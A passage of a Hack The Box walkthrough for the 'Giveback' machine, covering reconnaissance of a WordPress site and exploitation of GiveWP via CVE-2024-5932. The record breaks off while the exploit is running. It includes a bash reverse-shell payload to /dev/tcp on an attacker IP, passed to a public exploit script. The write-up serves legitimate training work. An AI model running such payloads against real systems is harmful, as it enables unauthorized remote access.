---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - WordPress
  - CVE-2024-5932
  - GiveWP
  - PHPObjectInjection
  - Container
  - CVE-2024-4577
  - PHPCGIArgumentInjection
  - Kubernetes
  - sudo
---

![](images/Giveback.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Initial Access](#Initial-Access)
    - [CVE-2024-5932: GiveWP PHP Object Injection Exploit](#CVE-2024-5932-GiveWP-PHP-Object-Injection-Exploit)
- [Enumeration (First Container)](#Enumeration-First-Container)
- [Lateral Movement to the second Container](#Lateral-Movement-to-the-second-Container)
    - [CVE-2024-4577: PHP-CGI Argument Injection](#CVE-2024-4577-PHP-CGI-Argument-Injection)
- [Enumeration (Second Container)](#Enumeration-Second-Container)
- [Privilege Escalation to babywyrm](#Privilege-Escalation-to-babywyrm)
    - [Kubernetes Secrets Exfiltration](#Kubernetes-Secrets-Exfiltration)
- [user.txt](#usertxt)
- [Enumeration (babywyrm)](#Enumeration-babywyrm)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Abusing sudo Misconfiguration](#Abusing-sudo-Misconfiguration)
- [root.txt](#roottxt)

## Summary

The box starts with an instance of `Wordpress` running on port `80/TCP`. It makes use of `GiveWP` which is vulnerable to `CVE-2024-5932` aka `PHP Object Injection` and this leads to `Initial Access` on the box.

However this only drops into a `shell` as `root` inside a `Container`. By checking the `Environment Variables` more information about an additional `Container` as well as various `Passwords` can be obtained.

By spinning up `Port Forwarding` the `Web Server` on the second `Container` is now accessible on port `5000/TCP`. The information which can be found there lead to `RCE` through `PHP-CGI Argument Injection` aka `CVE-2024-4577`. This allows to achieve `Lateral Movement` and grants access to the `Kubernetes Secrets Storage` which contain the `Passwords` for a `MariaDB` instance and an actual user on the box itself which stores the `user.txt`.

For `Privilege Escalation` to `root` it is necessary to abuse a binary within `/opt/` named `debug`. This is possible because the user is allowed to execute the binary with `elevated privileges` using `sudo`.

After figuring out which `administrative password` is required to actually run the `binary` all what is left is to create a `malicious config.json` to execute commands in the context of `root`. After that the way to the `root.txt` is open.

## Reconnaissance

### Port Scanning

As usual we started with our initial `port scan` using `Nmap` which revealed a few uncommon open ports like port `6443/TCP`, `10250/TCP` and `30686/TCP`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.70.248 --min-rate 10000
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 20:02 CET
Nmap scan report for 10.129.70.248
Host is up (0.19s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
6443/tcp  filtered sun-sr-https
10250/tcp filtered unknown
30686/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds
```

We extended our initial scan and checked for details about the ports. Right away the directory of `/wp-admin` caught our attention. That meant we had to deal with `Wordpress` as `Content Management System (CMS)`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 22,80,6443,10250,30686 10.129.70.248
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 20:03 CET
Nmap scan report for giveback.htb (10.129.70.248)
Host is up (0.12s latency).

PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp    open     http         nginx 1.28.0
|_http-generator: WordPress 6.8.1
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: nginx/1.28.0
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
6443/tcp  filtered sun-sr-https
10250/tcp filtered unknown
30686/tcp open     http         Golang net/http server
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Sat, 01 Nov 2025 19:03:43 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|     "serviceProxyHealthy": true
|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Sat, 01 Nov 2025 19:03:25 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|_    "serviceProxyHealthy": true
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30686-TCP:V=7.95%I=7%D=11/1%Time=6906597A%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Bal
SF:ancing-Endpoint-Weight:\x201\r\nDate:\x20Sat,\x2001\x20Nov\x202025\x201
SF:9:03:25\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\
SF:n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-servic
SF:e\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20t
SF:rue\n}")%r(HTTPOptions,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Balanc
SF:ing-Endpoint-Weight:\x201\r\nDate:\x20Sat,\x2001\x20Nov\x202025\x2019:0
SF:3:25\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t
SF:\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-service\"
SF:\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20true
SF:\n}")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,132,"
SF:HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/json\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Load-Balancing-Endpoint-Weight:\x201\r\
SF:nDate:\x20Sat,\x2001\x20Nov\x202025\x2019:03:43\x20GMT\r\nContent-Lengt
SF:h:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t\t\"namespace\":\x20\"defaul
SF:t\",\n\t\t\"name\":\x20\"wp-nginx-service\"\n\t},\n\t\"localEndpoints\"
SF::\x201,\n\t\"serviceProxyHealthy\":\x20true\n}")%r(LPDString,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.79 seconds
```

### Enumeration of Port 80/TCP

With the information we got so far we started with the website running on port `80/TCP`.

- [http://10.129.70.248/](http://10.129.70.248/)

A quick look at the `technology stack` using `whatweb` revealed the use of `Give` in version `3.14.0` in addition to the information about `Wordpress`.

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.70.248/
http://10.129.70.248/ [200 OK] Bootstrap[0.3], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.28.0], IP[10.129.70.248], JQuery[3.7.1], MetaGenerator[Give v3.14.0,WordPress 6.8.1], Script[speculationrules,text/javascript], Title[GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI], UncommonHeaders[link], WordPress[6.8.1], nginx[1.28.0]
```

On the website the we found a `Donation Page` page that offered a pretty catching `URL` which we kept in the back of our heads for potential later use.

![](images/2025-11-01_20-06_80_website.png)

![](images/2025-11-01_20-35_80_donation_station.png)

We added `giveback.htb` to our `/etc/hosts` file and started searching for `vulnerabilities` or `usernames` within `Wordpress` using`WPScan`.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.70.248   giveback.htb
```

```shell
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://giveback.htb --wp-content-dir wp-content --enumerate u,t,p                                              
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://giveback.htb/ [10.129.70.248]
[+] Started: Sat Nov  1 20:44:24 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://giveback.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://giveback.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://giveback.htb/, Match: 'WordPress 6.8.1'

[+] WordPress theme in use: bizberg
 | Location: http://giveback.htb/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *
 | Location: http://giveback.htb/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] give
 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2025-10-29T20:17:00.000Z
 | [!] The version is out of date, the latest version is 4.12.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://giveback.htb/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:23 <==========================================================================================================================================================================================================================================================================================================================================================> (400 / 400) 100.00% Time: 00:01:23
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] bizberg
 | Location: http://giveback.htb/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/bizberg/style.css, Match: 'Version: 4.2.9.79'

[+] green-wealth
 | Location: http://giveback.htb/wp-content/themes/green-wealth/
 | Latest Version: 0.3 (up to date)
 | Last Updated: 2025-07-12T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/green-wealth/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/green-wealth/style.css
 | Style Name: Green Wealth
 | Style URI: https://bizbergthemes.com/downloads/green-wealth/
 | Description: Green Wealth is a clean, modern, and fully responsive eco-friendly WordPress theme built as a child ...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 0.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/green-wealth/style.css, Match: 'Version: 0.3'

[+] twentytwentyfive
 | Location: http://giveback.htb/wp-content/themes/twentytwentyfive/
 | Latest Version: 1.3 (up to date)
 | Last Updated: 2025-08-05T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/twentytwentyfive/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/twentytwentyfive/style.css
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://giveback.htb/wp-content/themes/twentytwentyfive/, status: 403
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.3'

[+] twentytwentyfour
 | Location: http://giveback.htb/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.3 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/twentytwentyfour/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://giveback.htb/wp-content/themes/twentytwentyfour/, status: 403
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.3'

[+] twentytwentythree
 | Location: http://giveback.htb/wp-content/themes/twentytwentythree/
 | Latest Version: 1.6 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/twentytwentythree/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://giveback.htb/wp-content/themes/twentytwentythree/, status: 403
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.6'

[+] twentytwentytwo
 | Location: http://giveback.htb/wp-content/themes/twentytwentytwo/
 | Latest Version: 2.0 (up to date)
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/twentytwentytwo/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://giveback.htb/wp-content/themes/twentytwentytwo/, status: 200
 |
 | Version: 2.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/twentytwentytwo/style.css, Match: 'Version: 2.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <============================================================================================================================================================================================================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] user
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://giveback.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://giveback.htb/wp-json/oembed/1.0/embed?url=http://giveback.htb/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://giveback.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Nov  1 20:46:01 2025
[+] Requests Done: 479
[+] Cached Requests: 24
[+] Data Sent: 126.229 KB
[+] Data Received: 652.301 KB
[+] Memory used: 268.367 MB
[+] Elapsed time: 00:01:37
```

Unfortunately this did not end up very fruitful and so we moved back to check if we could get `foothold` through `Give`.

## Initial Access

### CVE-2024-5932: GiveWP PHP Object Injection Exploit

A quick research did the job and we found information about a `PHP Object Injection` vulnerability in `GiveWP` aka `CVE-2024-5932` and a related `Proof of Concept (PoC)` exploit.

- [https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)
- [https://github.com/EQSTLab/CVE-2024-5932](https://github.com/EQSTLab/CVE-2024-5932)

To fire it up we created a `virtual environment` and added our `payload` to get a `callback` and `Foothold` on the box.

```shell
┌──(kali㉿kali)-[~/tmp/Giveback/CVE-2024-5932]
└─$ python3 -m virtualenv venv
created virtual environment CPython3.13.7.final.0-64 in 470ms
  creator CPython3Posix(dest=/home/kali/tmp/Giveback/CVE-2024-5932/venv, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
    added seed packages: pip==25.2
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
```

```shell
┌──(kali㉿kali)-[~/tmp/Giveback/CVE-2024-5932]
└─$ source venv/bin/activate
```

```shell
┌──(venv)─(kali㉿kali)-[~/tmp/Giveback/CVE-2024-5932]
└─$ pip3 install -r requirements.txt 
Collecting requests (from -r requirements.txt (line 1))
  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
Collecting rich_click (from -r requirements.txt (line 2))
  Downloading rich_click-1.9.4-py3-none-any.whl.metadata (8.7 kB)
Collecting beautifulsoup4 (from -r requirements.txt (line 3))
  Downloading beautifulsoup4-4.14.2-py3-none-any.whl.metadata (3.8 kB)
Collecting Faker (from -r requirements.txt (line 4))
  Downloading faker-37.12.0-py3-none-any.whl.metadata (15 kB)
Collecting charset_normalizer<4,>=2 (from requests->-r requirements.txt (line 1))
  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
Collecting idna<4,>=2.5 (from requests->-r requirements.txt (line 1))
  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
Collecting urllib3<3,>=1.21.1 (from requests->-r requirements.txt (line 1))
  Using cached urllib3-2.5.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests->-r requirements.txt (line 1))
  Using cached certifi-2025.10.5-py3-none-any.whl.metadata (2.5 kB)
Collecting click>=8 (from rich_click->-r requirements.txt (line 2))
  Using cached click-8.3.0-py3-none-any.whl.metadata (2.6 kB)
Collecting rich>=12 (from rich_click->-r requirements.txt (line 2))
  Using cached rich-14.2.0-py3-none-any.whl.metadata (18 kB)
Collecting soupsieve>1.2 (from beautifulsoup4->-r requirements.txt (line 3))
  Downloading soupsieve-2.8-py3-none-any.whl.metadata (4.6 kB)
Collecting typing-extensions>=4.0.0 (from beautifulsoup4->-r requirements.txt (line 3))
  Using cached typing_extensions-4.15.0-py3-none-any.whl.metadata (3.3 kB)
Collecting tzdata (from Faker->-r requirements.txt (line 4))
  Downloading tzdata-2025.2-py2.py3-none-any.whl.metadata (1.4 kB)
Collecting markdown-it-py>=2.2.0 (from rich>=12->rich_click->-r requirements.txt (line 2))
  Using cached markdown_it_py-4.0.0-py3-none-any.whl.metadata (7.3 kB)
Collecting pygments<3.0.0,>=2.13.0 (from rich>=12->rich_click->-r requirements.txt (line 2))
  Using cached pygments-2.19.2-py3-none-any.whl.metadata (2.5 kB)
Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich>=12->rich_click->-r requirements.txt (line 2))
  Using cached mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
Using cached requests-2.32.5-py3-none-any.whl (64 kB)
Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
Using cached idna-3.11-py3-none-any.whl (71 kB)
Using cached urllib3-2.5.0-py3-none-any.whl (129 kB)
Downloading rich_click-1.9.4-py3-none-any.whl (70 kB)
Downloading beautifulsoup4-4.14.2-py3-none-any.whl (106 kB)
Downloading faker-37.12.0-py3-none-any.whl (2.0 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.0/2.0 MB 29.8 MB/s  0:00:00
Using cached certifi-2025.10.5-py3-none-any.whl (163 kB)
Using cached click-8.3.0-py3-none-any.whl (107 kB)
Using cached rich-14.2.0-py3-none-any.whl (243 kB)
Using cached pygments-2.19.2-py3-none-any.whl (1.2 MB)
Using cached markdown_it_py-4.0.0-py3-none-any.whl (87 kB)
Using cached mdurl-0.1.2-py3-none-any.whl (10.0 kB)
Downloading soupsieve-2.8-py3-none-any.whl (36 kB)
Using cached typing_extensions-4.15.0-py3-none-any.whl (44 kB)
Downloading tzdata-2025.2-py2.py3-none-any.whl (347 kB)
Installing collected packages: urllib3, tzdata, typing-extensions, soupsieve, pygments, mdurl, idna, click, charset_normalizer, certifi, requests, markdown-it-py, Faker, beautifulsoup4, rich, rich_click
Successfully installed Faker-37.12.0 beautifulsoup4-4.14.2 certifi-2025.10.5 charset_normalizer-3.4.4 click-8.3.0 idna-3.11 markdown-it-py-4.0.0 mdurl-0.1.2 pygments-2.19.2 requests-2.32.5 rich-14.2.0 rich_click-1.9.4 soupsieve-2.8 typing-extensions-4.15.0 tzdata-2025.2 urllib3-2.5.0
```

```shell
┌──(venv)─(kali㉿kali)-[~/tmp/Giveback/CVE-2024-5932]
└─$ python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c 'bash -c "/bin/bash -i >& /dev/tcp/10.10.16.97/9001 0>&1"'
                                                                                                                                                                                                                                                                                                            
             ..-+*******-                                                                                  
            .=#+-------=@.                        .:==:.                                                   
           .**-------=*+:                      .-=++.-+=:.                                                 
           +*-------=#=+++++++++=:..          -+:==**=+-+:.                                                
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..                                                
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.                                                  
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.                                                     
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.                                                       
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..       
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.    
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-    
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-    
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-    
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-    
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-    
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-    
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:    
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.    
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.    
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.     
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.                                                           
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=                                                           
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.                                                           
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.                                                            
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..                                                              
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#                                                                    
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#                                                                    
     :+++**##@#+=.      -%@@@%-   .-=*#.                                                                   
    .=+::+::-@:         #@@@@+. :+*=::=*-                                                                  
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*                                                                  
     :++---::--=*#+*+++++**+*+**-::::::+=                                                                  
      .+*=:::---+*:::::++++++*+=:::::-*=.                                                                  
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932    

                                                                                                                                                                                                                                                                                                         
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================    

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Requested Data: 
